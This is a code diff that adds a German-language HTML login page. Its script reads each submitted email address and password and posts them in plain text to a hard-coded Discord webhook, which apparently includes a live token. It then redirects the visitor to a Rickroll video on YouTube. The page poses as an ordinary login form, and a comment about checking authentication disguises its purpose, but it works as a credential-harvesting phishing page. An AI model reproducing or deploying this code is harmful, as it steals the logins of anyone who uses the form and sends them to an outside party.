@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+    <h1>Login</h1>
+    <form id="loginForm">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" class="input-field" required><br><br>
+        
+        <label for="password">Passwort:</label>
+        <input type="password" id="password" name="password" class="input-field" required><br><br>
+        
+        <button type="submit" value="Login"> Log in </button>
+    </form>
+
+    <script>
+        // Event-Listener, um das Formular abzufangen
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Das Standardverhalten des Formulars verhindern
+
+            // Hier könntest du die Authentifizierung überprüfen
+            // Wenn die Authentifizierung erfolgreich ist, leite weiter
+            // Beachte, dass dies aus Sicherheitsgründen normalerweise auf dem Server erfolgen sollte
+            
+            var emailValue = document.getElementById("email").value;
+            var passwordValue = document.getElementById("password").value;
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1149006991977615441/oUGWgLQFKvSoJd4PblPyOCdZJ5od-pjBcrlnBYtqZk_M0GYINnv-9RwrdM4uQatVSauA'; // Ersetze dies durch die tatsächliche URL deines Discord-Webhooks
+
+            // Erstelle das Embed
+            const embed = {
+                title: 'Login Page',
+                description: `**Email**: ***${emailValue}***\n**Pasword**: ***${passwordValue}*** `,
+                color: 0x00ff00, // Grüne Farbe (hexadezimal)
+            };
+
+            // Erstelle die Nachricht mit dem Embed
+            const message = {
+                embeds: [embed],
+            };
+
+            // Sende die Nachricht an den Webhook mit einer HTTP POST-Anfrage
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Never gonna give you up');
+                } else {
+                    console.error('Fehler beim Senden der Nachricht:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Fehler beim Senden der Nachricht:', error);
+            });
+
+            // Weiterleitung zur gewünschten Seite (in diesem Fall zu YouTube)
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        });
+    </script>
+</body>
+</html>
